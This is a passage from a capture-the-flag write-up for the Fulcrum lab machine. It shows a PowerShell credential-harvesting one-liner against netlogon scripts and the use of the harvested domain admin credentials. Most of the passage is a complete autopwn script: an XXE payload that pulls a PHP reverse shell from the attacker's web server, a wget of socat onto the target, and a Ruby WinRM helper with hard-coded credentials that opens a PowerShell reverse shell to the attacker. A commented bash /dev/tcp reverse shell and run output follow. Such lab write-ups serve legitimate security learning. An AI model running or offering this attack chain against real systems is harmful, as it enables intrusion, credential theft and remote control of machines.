</span></span><span class="line"><span class="cl">    <span class="nv">$pass</span> <span class="p">=</span> <span class="nv">$result</span><span class="p">.</span><span class="n">Matches</span><span class="p">[</span><span class="n">1</span><span class="p">].</span><span class="n">Groups</span><span class="p">[</span><span class="n">1</span><span class="p">].</span><span class="n">Value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">test</span> <span class="s2">&#34;fulcrum.local\$user&#34;</span> <span class="s2">&#34;$pass&#34;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nb">echo </span><span class="s2">&#34;fulcrum.local\$user $pass&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div></p>

<p>We convert it to one-liner and run it:
<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">fulcrum</span><span class="p">\</span><span class="n">btables</span><span class="nv">@FILE</span> <span class="n">netlogon</span><span class="p">&gt;</span> <span class="k">function</span> <span class="n">test</span><span class="p">(</span><span class="nv">$u</span><span class="p">,</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span> <span class="p">(</span><span class="nb">new-object</span> <span class="n">directoryservices</span><span class="p">.</span><span class="n">directoryentry</span> <span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$u</span><span class="p">,</span><span class="nv">$p</span><span class="p">).</span><span class="n">psbase</span><span class="p">.</span><span class="n">name</span> <span class="o">-ne</span> <span class="nv">$null</span><span class="p">;</span> <span class="p">};</span> <span class="nv">$files</span> <span class="p">=</span> <span class="p">@(</span><span class="nb">gci </span><span class="p">\\</span><span class="n">dc</span><span class="p">.</span><span class="n">fulcrum</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">netlogon</span><span class="p">\*.</span><span class="n">ps1</span><span class="p">);</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$file</span> <span class="k">in</span> <span class="nv">$files</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$result</span> <span class="p">=</span> <span class="nb">Select-String</span> <span class="n">-Path</span> <span class="nv">$file</span> <span class="n">-pattern</span> <span class="s2">&#34;&#39;(.*)&#39;&#34;</span><span class="p">;</span> <span class="nv">$user</span> <span class="p">=</span> <span class="nv">$result</span><span class="p">.</span><span class="n">Matches</span><span class="p">[</span><span class="n">0</span><span class="p">].</span><span class="n">Groups</span><span class="p">[</span><span class="n">1</span><span class="p">].</span><span class="n">Value</span><span class="p">;</span> <span class="nv">$pass</span> <span class="p">=</span> <span class="nv">$result</span><span class="p">.</span><span class="n">Matches</span><span class="p">[</span><span class="n">1</span><span class="p">].</span><span class="n">Groups</span><span class="p">[</span><span class="n">1</span><span class="p">].</span><span class="n">Value</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="n">test</span> <span class="s2">&#34;fulcrum.local\$user&#34;</span> <span class="s2">&#34;$pass&#34;</span><span class="p">)</span> <span class="p">{</span> <span class="nb">echo </span><span class="s2">&#34;fulcrum.local\$user $pass&#34;</span><span class="p">;</span> <span class="p">};</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">fulcrum</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">923a</span> <span class="nv">@fulcrum_bf392748ef4e_</span><span class="p">$</span></span></span></code></pre></div></div></p>

<p>Now we have the domain admin credentials. Let&rsquo;s get the root flag:
<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">fulcrum</span><span class="p">\</span><span class="n">btables</span><span class="nv">@FILE</span> <span class="n">netlogon</span><span class="p">&gt;</span> <span class="nv">$pass</span> <span class="p">=</span> <span class="nb">convertto-securestring</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span> <span class="n">-String</span> <span class="s1">&#39;@fulcrum_bf392748ef4e_$&#39;</span><span class="p">;</span> <span class="nv">$cred</span> <span class="p">=</span> <span class="nb">new-object</span> <span class="n">-typename</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="n">-argumentlist</span> <span class="s1">&#39;fulcrum.local\923a&#39;</span><span class="p">,</span><span class="nv">$pass</span><span class="p">;</span> <span class="nb">Invoke-Command</span> <span class="n">-ComputerName</span> <span class="n">dc</span><span class="p">.</span><span class="n">fulcrum</span><span class="p">.</span><span class="n">local</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-Port</span> <span class="n">5985</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="nb">cat </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">root</span><span class="p">.</span><span class="n">txt</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">8ddbe372e57c019bb6c4cdb5b35a0cab</span></span></span></code></pre></div></div></p>

<h1 id="autopwn-script">Autopwn script</h1>

<p>Here is my autopwn script for Fulcrum. It make use of a ruby helper as the python winrm module doesn&rsquo;t work correctly. Don&rsquo;t forget to set LHOST appropriately. It also needs superuser rights (to bind the privileged port 53) and socat. You can find the relevant files here: <a href="https://github.com/Alamot/code-snippets/tree/master/hacking/HTB/Fulcrum" target="_blank">https://github.com/Alamot/code-snippets/tree/master/hacking/HTB/Fulcrum</a></p>

<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python2</span>
</span></span><span class="line"><span class="cl"><span class="c1"># -*- coding: utf-8 -*-</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Author: Alamot (Antonios Tsolis)</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">signal</span><span class="o">,</span> <span class="nn">thread</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">urllib3</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">SimpleHTTPServer</span><span class="o">,</span> <span class="nn">SocketServer</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="n">Popen</span>
</span></span><span class="line"><span class="cl"><span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">signal</span><span class="o">.</span><span class="n">SIG_DFL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">DEBUG</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl"><span class="n">LHOST</span><span class="o">=</span><span class="s2">&#34;10.10.15.45&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">LPORT</span><span class="o">=</span><span class="mi">60001</span>
</span></span><span class="line"><span class="cl"><span class="n">LPORT2</span><span class="o">=</span><span class="mi">53</span>
</span></span><span class="line"><span class="cl"><span class="n">RHOST</span><span class="o">=</span><span class="s2">&#34;10.10.10.62&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">RPORT</span><span class="o">=</span><span class="mi">56423</span>
</span></span><span class="line"><span class="cl"><span class="n">SRVHOST</span><span class="o">=</span><span class="n">LHOST</span>
</span></span><span class="line"><span class="cl"><span class="n">SRVPORT</span><span class="o">=</span><span class="mi">60000</span>
</span></span><span class="line"><span class="cl"><span class="n">WINRM_RDPORT</span><span class="o">=</span><span class="mi">60217</span>
</span></span><span class="line"><span class="cl"><span class="n">TIMEOUT</span><span class="o">=</span><span class="mi">30</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">php_rev_shell</span> <span class="o">=</span> <span class="s1">&#39;&lt;?php set_time_limit (0); $VERSION = &#34;1.0&#34;; $ip = &#34;&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">LHOST</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;&#34;; $port = &#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">LPORT</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = &#34;uname -a; w; id; /bin/bash -i&#34;; $daemon = 0; $debug = 0; if (function_exists(&#34;pcntl_fork&#34;)) { $pid = pcntl_fork(); if ($pid == -1) { printit(&#34;ERROR: Cannot fork&#34;); exit(1); } if ($pid) { exit(0); } if (posix_setsid() == -1) { printit(&#34;Error: Cannot setsid()&#34;); exit(1); } $daemon = 1; } else { printit(&#34;WARNING: Failed to daemonise.  This is quite common and not fatal.&#34;); } chdir(&#34;/&#34;); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(&#34;$errstr ($errno)&#34;); exit(1); } $descriptorspec = array(0 =&gt; array(&#34;pipe&#34;, &#34;r&#34;), 1 =&gt; array(&#34;pipe&#34;, &#34;w&#34;), 2 =&gt; array(&#34;pipe&#34;, &#34;w&#34;)); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(&#34;ERROR: Cannot spawn shell&#34;); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(&#34;Successfully opened reverse shell to $ip:$port&#34;); while (1) { if (feof($sock)) { printit(&#34;ERROR: Shell connection terminated&#34;); break; } if (feof($pipes[1])) { printit(&#34;ERROR: Shell process terminated&#34;); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit(&#34;SOCK READ&#34;); $input = fread($sock, $chunk_size); if ($debug) printit(&#34;SOCK: $input&#34;); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit(&#34;STDOUT READ&#34;); $input = fread($pipes[1], $chunk_size); if ($debug) printit(&#34;STDOUT: $input&#34;); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit(&#34;STDERR READ&#34;); $input = fread($pipes[2], $chunk_size); if ($debug) printit(&#34;STDERR: $input&#34;); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) {  if (!$daemon) { print &#34;$string</span><span class="se">\\</span><span class="s1">n&#34;; } } ?&gt;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># This works too:</span>
</span></span><span class="line"><span class="cl"><span class="c1"># php_rev_shell=&#34;&lt;?php exec(\&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/&#34;+str(LHOST)+&#34;/&#34;+str(LPORT)+&#34; 0&gt;&amp;1&#39;\&#34;);&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ruby_helper</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;require &#39;winrm&#39;
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">conn = WinRM::Connection.new( 
</span></span></span><span class="line"><span class="cl"><span class="s2">  endpoint: &#39;https://&#34;&#34;&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">RHOST</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;:&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">WINRM_RDPORT</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;&#34;&#34;/wsman&#39;,
</span></span></span><span class="line"><span class="cl"><span class="s2">  transport: :ssl,
</span></span></span><span class="line"><span class="cl"><span class="s2">  user: &#39;WebUser&#39;,
</span></span></span><span class="line"><span class="cl"><span class="s2">  password: &#39;M4ng£m£ntPa55&#39;,
</span></span></span><span class="line"><span class="cl"><span class="s2">  :no_ssl_peer_verification =&gt; true
</span></span></span><span class="line"><span class="cl"><span class="s2">)
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">conn.shell(:powershell) do |shell|
</span></span></span><span class="line"><span class="cl"><span class="s2">  output = shell.run(&#34;$pass = convertto-securestring -AsPlainText -Force -String &#39;@fulcrum_bf392748ef4e_$&#39;; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist &#39;fulcrum.local</span><span class="se">\\\\</span><span class="s2">923a&#39;,$pass; Invoke-Command -ComputerName file.fulcrum.local -Credential $cred -Port 5985 -ScriptBlock {$client = New-Object System.Net.Sockets.TCPClient(&#39;&#34;&#34;&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">LHOST</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;&#39;,&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">LPORT2</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;&#34;&#34;); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%</span><span class="si">{0}</span><span class="s2">; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); try { $sendback = (iex $data | Out-String ); } catch { $sendback = ($_.Exception|out-string) }; $sendback2 = $sendback + &#39;PS &#39; + $(whoami) + &#39;@&#39; + $env:computername + &#39; &#39; + $((gi $pwd).Name) + &#39;&gt; &#39;; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close(); }&#34;) do |stdout, stderr|
</span></span></span><span class="line"><span class="cl"><span class="s2">    STDOUT.print stdout
</span></span></span><span class="line"><span class="cl"><span class="s2">    STDERR.print stderr
</span></span></span><span class="line"><span class="cl"><span class="s2">  end
</span></span></span><span class="line"><span class="cl"><span class="s2">  puts &#34;The script exited with exit code #</span><span class="si">{output.exitcode}</span><span class="s2">&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">end
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">start_webserver</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">Handler</span> <span class="o">=</span> <span class="n">SimpleHTTPServer</span><span class="o">.</span><span class="n">SimpleHTTPRequestHandler</span>
</span></span><span class="line"><span class="cl">        <span class="n">httpd</span> <span class="o">=</span> <span class="n">SocketServer</span><span class="o">.</span><span class="n">TCPServer</span><span class="p">((</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">SRVPORT</span><span class="p">),</span> <span class="n">Handler</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Serving payload at port &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">SRVPORT</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">httpd</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Web server thread exited successfully.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="p">(</span><span class="ne">KeyboardInterrupt</span><span class="p">,</span> <span class="ne">SystemExit</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">httpd</span><span class="o">.</span><span class="n">shutdown</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">send_payload</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">client</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">client</span><span class="o">.</span><span class="n">keep_alive</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># Send payload</span>
</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Sending php shell payload...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">xml</span><span class="o">=</span><span class="s2">&#34;&lt;?xml version=&#39;1.0&#39; encoding=&#39;UTF-8&#39; ?&gt;&lt;!DOCTYPE hack [&lt;!ENTITY xxe SYSTEM &#39;http://127.0.0.1:4/index.php?page=http://&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">SRVHOST</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;:&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">SRVPORT</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;/shell&#39; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&#34;http://&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">RHOST</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;:&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">RPORT</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;/&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">xml</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">RequestException</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">finally</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">client</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">client</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#log.info(&#34;Web payload thread exited successfully.&#34;)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;shell.php&#34;</span><span class="p">,</span> <span class="s2">&#34;wt&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">php_rev_shell</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;ruby_helper.rb&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">ruby_helper</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">th1</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">start_webserver</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">th2</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">send_payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">th1</span><span class="o">.</span><span class="n">daemon</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">    <span class="n">th2</span><span class="o">.</span><span class="n">daemon</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">    <span class="n">th1</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">th2</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">phpshell</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">LPORT</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">TIMEOUT</span><span class="p">)</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">phpshell</span><span class="o">.</span><span class="n">sock</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;Connection timeout.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">phpshell</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;cd /dev/shm&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Uploading socat for port redirection&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">phpshell</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;wget http://&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">SRVHOST</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;:&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">SRVPORT</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;/socat&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">phpshell</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;chmod +x socat&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">phpshell</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;./socat tcp-listen:&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">WINRM_RDPORT</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;,reuseaddr,fork tcp:192.168.122.228:5986 &amp;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#Uncomment if you want an interactive shell on the webserver instead of the file server</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#phpshell.interactive()</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#sys.exit()</span>
</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Executing ruby_helper.rb&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">Popen</span><span class="p">([</span><span class="s2">&#34;ruby&#34;</span><span class="p">,</span> <span class="s2">&#34;ruby_helper.rb&#34;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="n">pssh</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">LPORT2</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">TIMEOUT</span><span class="p">)</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">pssh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="p">(</span><span class="ne">KeyboardInterrupt</span><span class="p">,</span> <span class="ne">SystemExit</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">th1</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">th2</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span></span></span></code></pre></div>

<p>Let&rsquo;s run it:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo python2 autopwn_fulcrum.py 
</span></span><span class="line"><span class="cl"><span class="go">[*] Serving payload at port 60000
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Sending php shell payload...
</span></span></span><span class="line"><span class="cl"><span class="go">[+] Trying to bind to 0.0.0.0 on port 60001: Done
</span></span></span><span class="line"><span class="cl"><span class="go">[+] Waiting for connections on 0.0.0.0:60001: Got connection from 10.10.10.62 on port 58542
</span></span></span><span class="line"><span class="cl"><span class="go">10.10.10.62 - - [09/Jun/2018 19:50:11] &#34;GET /shell.php HTTP/1.0&#34; 200 -
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Uploading socat for port redirection
</span></span></span><span class="line"><span class="cl"><span class="go">10.10.10.62 - - [09/Jun/2018 19:50:11] &#34;GET /socat HTTP/1.1&#34; 200 -
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Executing ruby_helper.rb
</span></span></span><span class="line"><span class="cl"><span class="go">[+] Trying to bind to 0.0.0.0 on port 53: Done
</span></span></span><span class="line"><span class="cl"><span class="go">[+] Waiting for connections on 0.0.0.0:53: Got connection from 10.10.10.62 on port 32835
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Switching to interactive mode
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">$</span> whoami
</span></span><span class="line"><span class="cl"><span class="go">fulcrum\923a
</span></span></span><span class="line"><span class="cl"><span class="go">PS fulcrum\923a@FILE Documents&gt;
</span></span></span></code></pre></div></div></p>

        </div>

        <aside>
          <div class="p-share centered">
            <a href="https://www.buymeacoffee.com/alamot" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-coffee"></i></a>
            <a href="http://www.facebook.com/sharer.php?src=bm&u=https%3a%2f%2falamot.github.io%2ffulcrum_writeup%2f&t=Fulcrum%20write-up" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-facebook"></i></a>
            <a lang="en" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2ffulcrum_writeup%2f&text=Fulcrum%20write-up&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
            <a lang="el" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2ffulcrum_writeup%2f&text=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20Fulcrum&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
            <a lang="en" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2ffulcrum_writeup%2f&description=Fulcrum%20write-up&media=https://alamot.github.io/images/fulcrum.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
            <a lang="el" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2ffulcrum_writeup%2f&description=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20Fulcrum&media=https://alamot.github.io/images/fulcrum.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
          </div>
        </aside>
      </article>
      
